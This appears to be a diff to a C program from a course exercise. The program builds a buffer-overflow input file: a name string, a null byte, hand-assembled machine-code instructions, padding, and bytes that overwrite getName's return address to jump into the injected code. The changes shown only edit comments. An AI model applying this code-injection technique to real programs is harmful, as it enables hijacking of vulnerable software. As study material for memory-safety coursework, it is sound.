@@ -23,9 +23,9 @@ int main() {
     unsigned int bInstr;
     psFile = fopen("dataA", "w");
     
-    /* 15 bytes */
+    /* 15 bytes (authors' names) */
     fprintf(psFile, "Ishaan and Jack");
-    /* Writes 00000000 = 1 byte*/
+    /* Writes 00000000 = 1 byte. null byte*/
     fprintf(psFile, "%c", '\0'); 
 
     movInstr = MiniAssembler_mov(0, 'A');
@@ -33,7 +33,8 @@ int main() {
     strbInstr = MiniAssembler_strb(0, 1);
     bInstr = MiniAssembler_b(0x400864, 0x420074);
 
-    /* Write machine code instructions. Total 16 bytes. */
+    /* Write machine code instructions for 'A' attack.
+     4 bytes per instruction. Total 16 bytes. */
     fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
     fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
     fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
@@ -43,7 +44,7 @@ int main() {
     fprintf(psFile, "1234567812345678");
 
 
-    /* We want to replace getName's return address
+    /* Replace getName's return address
      with 0x420068 (address in BSS section where 
      machine code instructions begin*/
     fprintf(psFile, "%c", 0x68);
